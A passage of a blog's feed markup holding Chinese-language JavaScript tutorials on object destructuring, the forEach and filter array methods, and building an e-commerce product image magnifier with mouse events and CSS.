class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 这是后台传递过来的数据</span></span><br><span class="line"><span class="keyword">const</span> msg = &#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>: <span class="number">200</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>: <span class="string">&quot;获取新闻列表成功&quot;</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;5G商用自己，三大运用商收入下降&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>: <span class="number">58</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="number">2</span>,</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;国际媒体头条速览&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>: <span class="number">56</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: <span class="number">3</span>,</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;乌克兰和俄罗斯持续冲突&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>: <span class="number">1669</span></span><br><span class="line">&#125;,</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需求1： 请将以上msg对象  采用对象解构的方式 只选出  data 方面后面使用渲染页面</span></span><br><span class="line"><span class="keyword">const</span> &#123; data &#125; = msg</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line"><span class="comment">// 需求2： 上面msg是后台传递过来的数据，我们需要把data选出当做参数传递给 函数</span></span><br><span class="line"><span class="comment">// msg 虽有很多属性，但是我们利用解构只要 data值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">&#123; data &#125;</span>) &#123;</span><br><span class="line"><span class="comment">// 我们只要 data 数据</span></span><br><span class="line"><span class="comment">// 内部处理</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">render</span>(msg)  <span class="comment">// 在此处相当于const &#123; data &#125; = msg传入函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需求3， 为了防止msg里面的data名字混淆，要求渲染函数里面的数据名改为 myData</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">&#123; data: myData &#125;</span>) &#123;</span><br><span class="line"><span class="comment">// 要求将 获取过来的 data数据 更名为 myData</span></span><br><span class="line"><span class="comment">// 内部处理</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myData)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">render</span>(msg)</span><br></pre></td></tr></table></figure><h2 id="遍历数组forEach方法"><a href="#遍历数组forEach方法" class="headerlink" title="遍历数组forEach方法"></a>遍历数组forEach方法</h2><p><code>forEach()</code>方法用于调用数组的每个元素，并将元素传递给回调函数</p><p>注意：</p><ol><li>forEach 主要是遍历数组</li><li>参数当前数组元素是必须要写的，索引号可选。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// forEach 就是遍历  加强版的for循环  适合于遍历数组对象</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;pink&#x27;</span>]</span><br><span class="line">arr.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item, index</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(item)  <span class="comment">// 数组元素 red  green pink</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(index) <span class="comment">// 索引号</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240307180040.png" alt="image.png"></p><h2 id="filter筛选数组"><a href="#filter筛选数组" class="headerlink" title="filter筛选数组"></a>filter筛选数组</h2><p><code>filter()</code>方法创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素</p><p>主要使用场景： 筛选数组符合条件的元素，并返回筛选之后元素的新数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="keyword">const</span> nA = arr.<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">item, index</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> item &gt;= <span class="number">20</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nA) <span class="comment">// [20, 30]</span></span><br><span class="line"><span class="comment">// 返回的符合条件的新数组</span></span><br><span class="line"><span class="comment">// 使用箭头函数</span></span><br><span class="line"><span class="keyword">const</span> newArr = arr.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item &gt;= <span class="number">20</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newArr)</span><br></pre></td></tr></table></figure><ul><li><strong>返回值：</strong> 返回数组，包含了符合条件的所有元素，如果没有符合条件的元素则返回空数组</li><li><strong>参数：</strong> currentValue必须写，index可选</li><li>因为返回新数组，所有不会影响原数组</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-案例应用-商品放大镜</title>
      <link href="/2024/03/05/JavaScript-%E6%A1%88%E4%BE%8B%E5%BA%94%E7%94%A8-%E5%95%86%E5%93%81%E6%94%BE%E5%A4%A7%E9%95%9C/"/>
      <url>/2024/03/05/JavaScript-%E6%A1%88%E4%BE%8B%E5%BA%94%E7%94%A8-%E5%95%86%E5%93%81%E6%94%BE%E5%A4%A7%E9%95%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="案例简介"><a href="#案例简介" class="headerlink" title="案例简介"></a>案例简介</h1><p>在京东等网站当中，有这种商品放大的功能，就是把鼠标放在图片上，会在旁边出现放大的效果。</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240305222023.png" alt="image.png"></p><p><strong>具体分析：</strong></p><ul><li>鼠标经过对应小盒子，左侧中等盒子显示对应中等图片</li><li>鼠标经过中盒子，右侧会显示放大镜效果的大盒子</li><li>黑色遮罩盒子跟着鼠标来移动</li><li>鼠标在中等盒子上移动，大盒子的图片跟着显示对应位置</li></ul><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><h2 id="基础样式"><a href="#基础样式" class="headerlink" title="基础样式"></a>基础样式</h2><p>首先先实现基本的样式，再配合JavaScript实现功能，具体代码在后面全部代码部分</p><h2 id="JS实现部分"><a href="#JS实现部分" class="headerlink" title="JS实现部分"></a>JS实现部分</h2><p><strong>鼠标经过对应小盒子，左侧中等盒子显示对应中等图片</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240305231008.png" alt="image.png"></p><ol><li>获取对应的元素</li><li>采取事件委托的形式，监听鼠标经过小盒子里面的图片， 注意此时需要使用 <code>mouseover</code> 事件，因为需要事件冒泡触发<code>small</code></li><li>让鼠标经过小图片的爸爸<code>li</code>盒子，添加外选择框类，其余的<code>li</code>移除类（注意先移除，后添加）</li><li>鼠标经过小图片，可以拿到小图片的src， 可以做两件事<ul><li>让中等盒子的图片换成这个小图片的<code>src</code></li><li>让大盒子的背景图片，也换成这个小图片的<code>src</code></li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取对应的元素</span></span><br><span class="line"><span class="keyword">const</span> small = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.small&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> middle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.middle&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> large = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.large&#x27;</span>)</span><br><span class="line"><span class="comment">//采取事件委托的形式，监听鼠标经过</span></span><br><span class="line">small.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseover&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(e.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&#x27;IMG&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//移除li当中的active类</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.active&#x27;</span>).<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line"><span class="comment">//添加active类，active类为选择框</span></span><br><span class="line">e.<span class="property">target</span>.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line"><span class="comment">//将小图片赋值给中盒子和大盒子的图片</span></span><br><span class="line">middle.<span class="title function_">querySelector</span>(<span class="string">&#x27;img&#x27;</span>).<span class="property">src</span> = e.<span class="property">target</span>.<span class="property">src</span></span><br><span class="line">large.<span class="property">style</span>.<span class="property">backgroundImage</span> = <span class="string">`url(<span class="subst">$&#123;e.target.src&#125;</span>)`</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>鼠标经过中盒子，右侧会显示放大镜效果的大盒子</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240305231210.png" alt="image.png"></p><ol><li>用到鼠标经过和离开，鼠标经过中盒子，大盒子利用 <code>display</code> 来显示和隐藏</li><li>鼠标离开不会立马消失，而是有<strong>200ms</strong>的延时，用户体验更好，所以尽量使用定时器做个延时 <code>setTimeout</code></li><li>显示和隐藏也尽量定义一个函数，因为鼠标经过离开中等盒子，会显示隐藏，同时，<strong>鼠标经过大盒子，也会显示和隐藏</strong></li><li>给大盒子里面的背景图片一个默认的第一张图片</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监听鼠标经过和离开</span></span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, show)</span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, hide)</span><br><span class="line">large.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, show)</span><br><span class="line">large.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, hide)</span><br><span class="line"><span class="comment">//timeId用于清除计时器</span></span><br><span class="line"><span class="keyword">let</span> timeId = <span class="literal">null</span></span><br><span class="line"><span class="comment">//显示函数，在鼠标经过中盒子和大盒子都显示，通过修改display的值，显示时清除计时器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="built_in">clearTimeout</span>(timeId)</span><br><span class="line">large.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//隐藏函数，当鼠标离开中盒子和大盒子都隐藏，并设有计时器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hide</span>(<span class="params"></span>) &#123;</span><br><span class="line">timeId = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">large.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">&#125;, <span class="number">200</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>为什么需要在显示时清除计时器，因为如果没有清除计时器，在鼠标离开的200ms之内再次进入盒子，在时间到时，大盒子仍然会被隐藏。</li></ul><p><strong>黑色遮罩盒子跟着鼠标来移动</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240305231243.png" alt="image.png"></p><ol><li>先做鼠标经过中等盒子，显示隐藏黑色遮罩的盒子</li><li>让黑色遮罩跟着鼠标来走, 需要用到鼠标移动事件<code>mousemove</code></li><li>让黑色盒子的移动的核心思想：不断把鼠标在中等盒子内的坐标给黑色遮罩层 <code>let</code>、<code>top</code> 值，这样遮罩层就可以跟着移动了<ul><li>得到鼠标在页面中的坐标 利用事件对象的<code>pageX</code></li><li>得到中等盒子在页面中的坐标<code>middle.getBoundingClientRect()</code></li><li>鼠标在中盒子里面的坐标 &#x3D; 鼠标在页面中的坐标 - 中等盒子的坐标</li><li>黑色遮罩层不断得到鼠标在中盒子中的坐标，就可以移动起来了</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监听鼠标经过离开，设置黑色遮罩层显示隐藏</span></span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">layer.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseleave&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">layer.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//监听鼠标移动，实时获取鼠标在页面的坐标，通过运算得到黑色遮罩层的坐标</span></span><br><span class="line">middle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"><span class="comment">//middle.getBoundingClientRect().left为中盒子在页面当中的坐标，left为x坐标，top为y坐标</span></span><br><span class="line"><span class="keyword">let</span> x = e.<span class="property">pageX</span> - middle.<span class="title function_">getBoundingClientRect</span>().<span class="property">left</span></span><br><span class="line"><span class="keyword">let</span> y = e.<span class="property">pageY</span> - middle.<span class="title function_">getBoundingClientRect</span>().<span class="property">top</span></span><br><span class="line"><span class="comment">//mx、my为移动坐标，指黑色遮罩层关于父级的位置</span></span><br><span class="line"><span class="keyword">let</span> mx = <span class="number">0</span>, my = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x &lt; <span class="number">100</span>) mx = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(x &gt;= <span class="number">100</span> &amp;&amp; x &lt;= <span class="number">300</span>) mx = x - <span class="number">100</span></span><br><span class="line"><span class="keyword">if</span>(x &gt; <span class="number">300</span>) mx = <span class="number">200</span></span><br><span class="line"><span class="keyword">if</span>(y &lt; <span class="number">100</span>) my = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(y &gt;= <span class="number">100</span> &amp;&amp; y &lt;= <span class="number">300</span>) my = y - <span class="number">100</span></span><br><span class="line"><span class="keyword">if</span>(y &gt; <span class="number">300</span>) my = <span class="number">200</span></span><br><span class="line"><span class="comment">//将运算得到的坐标赋值给layer黑色遮罩层盒子</span></span><br><span class="line">layer.<span class="property">style</span>.<span class="property">left</span> = mx + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">layer.<span class="property">style</span>.<span class="property">top</span> = my + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>注意：<ol><li>限定遮罩的盒子只能在middle 内部移动，需要添加判断<ul><li>因为基础样式设定为400 x 400的中盒子</li><li>限定水平方向 大于等于0 并且小于等于 400</li><li>限定垂直方向 大于等于0 并且小于等于 400</li></ul></li><li>遮罩盒子移动的坐标：<ul><li>声明一个 mx 作为移动的距离</li><li>水平坐标 x 如果小于100 ，则移动的距离<code>mx</code>就是 0，不应该移动</li><li>水平坐标如果大于等于100 并且小于等于300，移动的距离就是 mx - 100 （100是遮罩盒子自身宽度的一半）</li><li>水平坐标 如果大于300，移动的距离就是<code>mx</code>就是200，不应该在移动了</li><li>垂直同理</li></ul></li><li>y坐标特殊，需要减去页面被卷去的头部<ul><li>为什么不用<code>box.offsetLeft</code>和<code>box.offsetTop</code>因为这俩属性跟带有定位的父级有关系，很容被父级影响，而<code>getBoundingClientRect()</code>不受定位的父元素的影响</li></ul></li></ol></li></ul><p><strong>鼠标在中等盒子上移动，大盒子的图片跟着显示对应位置</strong>：</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240305231310.png" alt="image.png"></p><ol><li>设置大盒子的背景图片尺寸为800 x 800，大盒子为400 x 400，所以实现放大效果</li><li>鼠标在中等盒子中的移动坐标，赋值给大盒子的图片，需要放大效果，所以需要两倍赋值</li><li>大盒子的图片需要反向移动，所以需要赋的值为负值</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的mx、my可以直接使用layer黑色遮罩层的移动坐标</span></span><br><span class="line">large.<span class="property">style</span>.<span class="property">backgroundPositionX</span> = -<span class="number">2</span> * mx + <span class="string">&#x27;px&#x27;</span></span><br><span class="line">large.<span class="property">style</span>.<span class="property">backgroundPositionY</span> = -<span class="number">2</span> * my + <span class="string">&#x27;px&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="全部代码"><a href="#全部代码" class="headerlink" title="全部代码"></a>全部代码</h1><h2 id="HTML部分"><a href="#HTML部分" class="headerlink" title="HTML部分"></a>HTML部分</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--middle为中盒子，layer为黑色遮罩层（用于表示放大区域）--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--small为小盒子，为商品列表，large为大盒子，大盒子默认隐藏（display: none）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pic&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/blue.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layer&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;small&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/blue.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;active&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/green.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/pink.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/yellow.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/black.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;large&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS部分"><a href="#CSS部分" class="headerlink" title="CSS部分"></a>CSS部分</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">li</span>&#123;</span><br><span class="line"><span class="attribute">list-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">420px</span>;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#bfbfbf</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line"><span class="attribute">padding-top</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.pic</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">480px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.middle</span>&#123;<span class="comment">/*中盒子*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.middle</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.small</span>&#123;<span class="comment">/*小盒子*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.small</span> <span class="selector-tag">ul</span>&#123;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.small</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">70px</span>;</span><br><span class="line"><span class="attribute">margin-bottom</span>: <span class="number">12.5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.small</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">70px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.active</span> &#123;<span class="comment">/*选择框类*/</span></span><br><span class="line"><span class="attribute">border</span>: <span class="number">3px</span> solid green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.large</span> &#123;<span class="comment">/*大盒子*/</span></span><br><span class="line"><span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.5</span>);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">1194px</span>;</span><br><span class="line"><span class="attribute">display</span>: none;</span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">img/blue.jpg</span>);</span><br><span class="line"><span class="attribute">background-size</span>: <span class="number">800px</span> <span class="number">800px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 